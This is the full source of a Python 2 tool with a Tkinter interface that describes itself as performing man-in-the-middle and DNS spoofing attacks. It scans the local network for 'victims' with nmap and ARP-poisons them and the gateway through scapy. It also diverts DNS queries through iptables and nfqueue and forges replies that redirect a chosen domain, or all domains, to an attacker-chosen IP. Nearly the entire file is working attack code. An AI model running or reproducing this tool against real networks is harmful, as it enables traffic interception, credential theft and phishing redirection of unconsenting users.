#!/usr/bin/env python
# -*- coding: utf-8 -*-
# to do : check returned error codes
# ----------------------------------------------------------------------------------------------------#
#                                          PRE-REQUISTES                                              #
# ----------------------------------------------------------------------------------------------------#
# 1 - apt-get install python-scapy                                             			      #
# 2 - apt-get install python-netifaces python-netaddr      		         		      #
# 3 - apt-get install python-nmap 								      #
#     If error with PortScanner or is not found, install from source :	 			      #
# 		- tar zxvf python-nmap-0.4.4.tar.gz						      #
#  		- cd python-nmap-0.4.4/								      #
#		- python setup.py install                                                             #                                                  
# 4 - apt-get install nfqueue-bindings-python                                                         #
# 5 - SSL Activation on webserver: 								      #
# 		- a2enmod ssl 									      #
# 		- a2ensite default-ssl                                                   	      #
# 		- service apache2 reload			                                      #
# 6 - Redirect 404 (NotFound) errors to index on webserver                                            #                                                                                #
# --------------------------------------------------------------------------------------------------- #

__author__ = 'Alexandre Basquin'
__description__ = 'This tool can perform Man In The Middle Attacks and DNS Spoofing Attacks with different functionalities.'
__copyright__ = 'Copyright 2015, Alexandre Basquin'
__credits__ = ['Alexandre Basquin']
__license__ = 'GPL'
__version__ = '2.7'
__maintainer__ = 'Alexandre Basquin'
__email__ = 'alexandre.basquin@gmail.com'
__status__ = 'Developpement'

# --------------------------------------------------------------------------------------------------- #
#                                                IMPORTS                                              #
# --------------------------------------------------------------------------------------------------- #
import os, sys, subprocess, re, time
import Tkinter as tk
import socket
import netifaces
import netaddr
import commands
import threading
import nfqueue
import nmap
import argparse
import signal
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import *
from twisted.internet import reactor
from twisted.internet.interfaces import IReadDescriptor
from time import sleep

# --------------------------------------------------------------------------------------------------- #
#                                                VARIABLES                                            #
# --------------------------------------------------------------------------------------------------- #

victims = []
victims_mac = []

try:
	gateways = netifaces.gateways()
	iface = gateways['default'][2][1]
	default_gw = gateways['default'][netifaces.AF_INET][0]
	my_ip = netifaces.ifaddresses(iface)[2][0]['addr']
	my_mac = get_if_hwaddr(iface)
	netmask = netifaces.ifaddresses(iface)[2][0]['netmask']
	broadcast = netifaces.ifaddresses(iface)[2][0]['broadcast']
except:
	print '\033[31mPlease check your internet connection!\033[37m'
	sys.exit(1)

global count_vic
count_vic = 0
global count_gw
count_gw = 0

# --------------------------------------------------------------------------------------------------- #
#                                                FONCTIONS                                            #
# --------------------------------------------------------------------------------------------------- #

def arg_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', '--victim', help='ARPSpoof - Enter the IP address of the victim. Example: -v 192.168.1.12')
    parser.add_argument('-n', '--network', help='ARPSpoof - No value needed. It will spoof any victim as possible automatically. Example: -n')
    parser.add_argument('-d', '--domain', help='DNSSpoof - Enter the domain to spoof. Example: -d gmail.com')
    parser.add_argument('-a', '--spoofall', help='DNSSPoof - Spoof any requested domains. Example: -a', action='store_true')
    parser.add_argument('-t', '--redirectto', help='DNSSpoof - Specifiy a remote IP to be included in the spoofed DNS answers. If not specify the default IP is your local IP. \
                        Requiere ether -d or -a options. Example: -t 73.121.167.22')
    return parser.parse_args()

def ip_forward():
	ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
	ipf_read = ipf.read()
	if ipf_read != '1\n':
		ipf.write('1\n')
		ipf.close()

def stop_ip_forward():
    ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
    ipf_read = ipf.read()
    if ipf_read != '0\n':
        ipf.write('0\n')
    ipf.close()

def nm_scan(cidr):
	nm = nmap.PortScanner()
	nm.scan(hosts=cidr, arguments='-n -sP -PE -PA21,23,80,3389 --exclude %s,%s' % (my_ip, default_gw))
	host_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]

	print '===================================================================='
	print '                      \033[32m  Available Victim(s)  \033[37m       '
	print '===================================================================='

	for host, status in host_list:
		victims.append(host)
		print '\033[32m[+] ' + str(host), str(status) + '\033[37m'
	if len(victims) > 0:
		print ''
		print '\033[32mAvailable victims: \033[37m' + '\033[32m' + str(len(victims)) + '\033[37m'
	else:
  		print '\033[31mNo potential victim found on the network: %s\033[37m' % (str(cidr_addr))
	
	for h in nm.all_hosts():
		if 'mac' in nm[h]['addresses']:
			mac = nm[h]['addresses']['mac']
			victims_mac.append(mac)
	
def origin_mac(ip):
	ans,unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3, verbose=0)
	for s,r in ans:
		mac = r[Ether].src
		victims_mac.append(mac)
		return r[Ether].src

def arp_poison(router_ip, victim_ip, router_mac, victim_mac):
	try:
		send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac), count=1, verbose=0)
		#threading.Thread(send(ARP(op=2, pdst=victim, psrc=router, hwdst=victimMAC), count=3, verbose=0)).start()
		logging.info('arp sent to %s' % victim_ip)
		#os.system('echo 'ARP packet sent' >> logfile2.log')
		
		send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac), count=1, verbose=0) 
		#threading.Thread(send(ARP(op=2, pdst=router, psrc=victim, hwdst=routerMAC), count=3, verbose=0)).start()
		logging.info('arp sent to %s' % router_ip)
	except:
		sys.exit(1)

def arp_poisoning_call():
	global count_vic
  	global count_gw

  	if running:
  		#while True:
		for ip, mac in zip(victims, victims_mac):
			threading.Thread(target=arp_poison,args=(default_gw, ip, gw_mac_address, mac)).start()
			count_vic +=1
			count_gw +=1
			show_arp_count(ip, default_gw)
		time.sleep(0.5)
	root.after(1000, arp_poisoning_call)

def start_arp_poisoning():
    '''Enable scanning by setting the global flag to True.'''
    global running
    running = True

    print ''
    print '===================================================================='
    print '                       \033[32m   ARP Poisonning  \033[37m          '
    print '===================================================================='

    # ip forwarding activation
    ip_forward()
    root.after(500, arp_poisoning_call)  # After 1/2 second, call arp_poisoning_call

def stop_arp_poisoning():
    '''Stop scanning by setting the global flag to False.'''
    global running
    running = False
    print '\r\033[31mARP Poisoning stopped.\033[37m                                                                '

#pb dans les restore (checker les mac dans l'output)
def restore(router_ip, victim_ip, router_mac, victim_mac):
    send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=victim_mac), count=3, verbose=0)
    print 'Sending to Gateway %s:	%s <--> %s' % (router_ip, victim_ip, victim_mac)
    send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=router_mac), count=3, verbose=0)
    print 'Sending to Victim  %s:	%s <--> %s' % (victim_ip, router_ip, router_mac)

def show_arp_count(victim_ip, router_ip):
	print '\r',         # commas are needed.
	print '\033[32m[+]\033[37m Sending ARP packets to the GW \033[32m%s\033[37m : \033[31m' % (router_ip) + str(count_gw) + '\033[37m',
	#time.sleep(0.2)
	print 'and the victim \033[32m%s\033[37m : \033[31m' % (victim_ip) + str(count_vic) + '\033[37m ',
	#print '\r',
	time.sleep(0.2)
	sys.stdout.flush()  # flush needed.

def signal_handler(signal, frame):
	print ''
	print ''
	print '===================================================================='
	print '                 \033[32m   Cleaning before shutdown  \033[37m      '
	print '===================================================================='
	print '\033[32mSending ARP packets to restore original MAC addresses:\033[37m'
	for ip, mac in zip(victims, victims_mac):
		gw_mac_address = origin_mac(default_gw)
		restore(default_gw, ip, gw_mac_address, mac)
	print ''
	print '\033[32mClearing iptables ...\033[37m'
	os.system('/sbin/iptables -F')
	os.system('/sbin/iptables -X')
	os.system('/sbin/iptables -t nat -F')
	os.system('/sbin/iptables -t nat -X')
	print '\033[32mTurning off ip forwarding\033[37m'
	stop_ip_forward()
	print '\033[32mProgram shutdown\033[37m'
	sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

def clean_and_quit():
	print ''
	print ''
	print '===================================================================='
	print '                 \033[32m   Cleaning before shutdown  \033[37m      '
	print '===================================================================='
	print '\033[32mSending ARP packets to restore original MAC addresses:\033[37m'
	for ip, mac in zip(victims, victims_mac):
		gw_mac_address = origin_mac(default_gw)
		restore(default_gw, ip, gw_mac_address, mac)
	print ''
	print '\033[32mClearing iptables ...\033[37m'
	os.system('/sbin/iptables -F')
	os.system('/sbin/iptables -X')
	os.system('/sbin/iptables -t nat -F')
	os.system('/sbin/iptables -t nat -X')
	print '\033[32mTurning off ip forwarding\033[37m'
	stop_ip_forward()
	print '\033[32mProgram shutdown\033[37m'
	sys.exit(0)


def cb(junk, payload):
    # put the payload in 'data'
    data = payload.get_data()
    # put IP packet content in 'pkt'
    pkt = IP(data)
    local_ip = my_ip
    # if no DNSQR layer (DNS query)
    if not pkt.haslayer(DNSQR):
	# Let the packet pass
        payload.set_verdict(nfqueue.NF_ACCEPT)
    else:
        if arg_parser().spoofall:
            if not arg_parser().redirectto:
                spoofed_pkt(payload, pkt, local_ip)
            else:
                spoofed_pkt(payload, pkt, arg_parser().redirectto)
        if arg_parser().domain:
	    # if option '-d' is in field (pkt[DNS].qd.qname) 
            if arg_parser().domain in pkt[DNS].qd.qname:
                if not arg_parser().redirectto:
                    spoofed_pkt(payload, pkt, local_ip)
                else:
                    spoofed_pkt(payload, pkt, arg_parser().redirectto)

def spoofed_pkt(payload, pkt, rIP):
    # On cree une varibale 'spoofed_pkt' dans laquelle on va inserer le paquet cree. 
    # Couche IP : IPdst = old_pkt:IPsrc et IPsrc = old_pkt:IPdst
    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=rIP))
    payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
    print '\r\033[32m[+] Sent spoofed packet to \033[37m%s \033[32mfor \033[37m%s                                             \
    						\r' % (pkt[IP].src, pkt[DNSQR].qname[:-1])

def start_dns_spoofing():
	# Send DNS packets to nfqueue
	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
	Queued()
  	rctr = threading.Thread(target=reactor.run, args=(False,))
  	rctr.daemon = True
  	rctr.start()


running = True  # Global flag


class Page(tk.Frame):
    def __init__(self, *args, **kwargs):
        tk.Frame.__init__(self, *args, **kwargs)
    def show(self):
        self.lift()

class Page1(Page):
   def __init__(self, *args, **kwargs):
       Page.__init__(self, *args, **kwargs)
       label = tk.Label(self, text='Scan the network')
       label.pack(side='top', fill='both', expand=True)
       button_scan = tk.Button(self, text='Scan the network', command=lambda: nm_scan(str(cidr_addr))).pack()
       #button_scan = tk.Button(self, text='Scan the network', command=lambda: threading.Thread(nm_scan(str(cidr_addr)))).pack()

class Page2(Page):
   def __init__(self, *args, **kwargs):
       Page.__init__(self, *args, **kwargs)
       label = tk.Label(self, text='ARP Spoofing')
       label.pack(side='top', fill='both', expand=True)
       button_arp_start = tk.Button(self, text='Start ARP Spoofing', command=lambda: start_arp_poisoning()).pack()
       button_arp_stop = tk.Button(self, text='Stop ARP Spoofing', command=lambda: stop_arp_poisoning()).pack()

class Page3(Page):
   def __init__(self, *args, **kwargs):
       Page.__init__(self, *args, **kwargs)
       label = tk.Label(self, text='DNS Spoofing')
       label.pack(side='top', fill='both', expand=True)
       button_dns_start = tk.Button(self, text='Start DNS Spoofing', command=lambda: start_dns_spoofing()).pack()
       button_dns_stop = tk.Button(self, text='Stop DNS Spoofing', command=lambda: clean_and_quit()).pack()

class MainView(tk.Frame):
    def __init__(self, *args, **kwargs):
        tk.Frame.__init__(self, *args, **kwargs)
        p1 = Page1(self)
        p2 = Page2(self)
        p3 = Page3(self)

        buttonframe = tk.Frame(self)
        container = tk.Frame(self)
        buttonframe.pack(side='top', fill='x', expand=False)
        container.pack(side='top', fill='both', expand=True)

        p1.place(in_=container, x=0, y=0, relwidth=1, relheight=1)
        p2.place(in_=container, x=0, y=0, relwidth=1, relheight=1)
        p3.place(in_=container, x=0, y=0, relwidth=1, relheight=1)

        b1 = tk.Button(buttonframe, text='Scan', command=p1.lift)
        b2 = tk.Button(buttonframe, text='ARP Spoofing', command=p2.lift)
        b3 = tk.Button(buttonframe, text='DNS Spoofing', command=p3.lift)

        b1.pack(side='left')
        b2.pack(side='left')
        b3.pack(side='left')

        p1.show()


class Queued(object):
    def __init__(self):
	# On met dans self.q les paquets present dans la file d'attente
        self.q = nfqueue.queue()
	# On parse le paquet et on charge la reponse DNS spoofee
        self.q.set_callback(cb)
	# On cree la socket et on la bind avec la file d'attente 0
        self.q.fast_open(0, socket.AF_INET)
        self.q.set_queue_maxlen(5000)
        reactor.addReader(self)
        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
        if (arg_parser().domain or arg_parser().spoofall or arg_parser().redirectto):
        	print '\033[31m[*] DNS Spoofing: Waiting for DNS queries\033[37m'
    def fileno(self):
        return self.q.get_fd()
    def doRead(self):
        self.q.process_pending(100)
    def connectionLost(self, reason):
        reactor.removeReader(self)
    def logPrefix(self):
        return 'queue'


# --------------------------------------------------------------------------------------------------- #
#                                                PROGRAM                                              #
# --------------------------------------------------------------------------------------------------- #


if __name__ == '__main__':
	# is the current user, root ?
	if os.getuid() != 0:
		print '\033[31m[-] Please run this program as root\033[37m'
		sys.exit(1)

	logging.basicConfig(filename='arp_spoof.log', level=logging.INFO) 

	# resolve default gateway mac address
	gw_mac_address = origin_mac(default_gw)

	# Network CIDR address and Network range
	my_ip_format = netaddr.IPAddress(my_ip)
	network_mask = netaddr.IPAddress(netmask)
	network_addr = my_ip_format & network_mask
	cidr_addr = netaddr.IPNetwork(str(network_addr) + '/' + str(network_mask))
	net_range = netaddr.IPRange(cidr_addr[1], cidr_addr[-2])

	print '===================================================================='
	print '                      \033[32m  Your informations  \033[37m         '
	print '===================================================================='
	print ' Default interface              : ' + iface
	print ' MAC address                    : ' + my_mac
	print ' IP address                     : ' + my_ip
	print ' Netmask                        : ' + netmask
	print ''

	if arg_parser().domain and not arg_parser().redirectto:
		print '\033[32mMode \'DNS Spoofing\' detected for the domain: %s\033[37m' % (arg_parser().domain)
		print '\033[32mSpoofed DNS packets will point to your local IP address: %s\033[37m' % (my_ip)
	elif arg_parser().spoofall and not arg_parser().redirectto:
		print '\033[32mMode \'DNS Spoofing\' detected for all domains !\033[37m'
		print '\033[32mSpoofed DNS packets will point to your local IP address: %s\033[37m' % (my_ip)
	elif arg_parser().redirectto and arg_parser().domain:
		print '\033[32mMode \'DNS Spoofing\' detected for the domain: %s\033[37m' % (arg_parser().domain)
		print '\033[32mArgument \'Redirect to\' detected !\033[37m'
		print '\033[32mSpoofed DNS packets will point to: %s\033[37m' % (arg_parser().redirectto)
	elif arg_parser().redirectto and arg_parser().spoofall:
		print '\033[32mMode \'DNS Spoofing\' detected for all domains !\033[37m'
		print '\033[32mArgument \'Redirect to\' detected !\033[37m'
		print '\033[32mSpoofed DNS packets will point to %s\033[37m' % (arg_parser().redirectto)
	else:
		print '\033[32mMode \'SPOOF ARP ONLY\' detected !\033[37m'
		print '\033[32mYou will get a position of MITM but Spoof DNS mode is off\033[37m'

	print '===================================================================='
	print '                        \033[32m  Network infos  \033[37m           '
	print '===================================================================='
	print ' Network address (CIDR)         : ' + str(cidr_addr)
	print ' Gateway IP address             : ' + default_gw
	print ' Gateway MAC address            : ' + gw_mac_address
	print ' Broadcast                      : ' + broadcast
	print ' Network range                  : ' + str(net_range)
	print ''

	# Define and start tkinter GUI
	root = tk.Tk()
	main = MainView(root)
	main.pack(side='top', fill='both', expand=True)
	root.title('DNS Spoofing Application - v2.7')
	#root.vm_iconbitmap("app.ico")
	root.wm_geometry('500x150')

	root.mainloop()
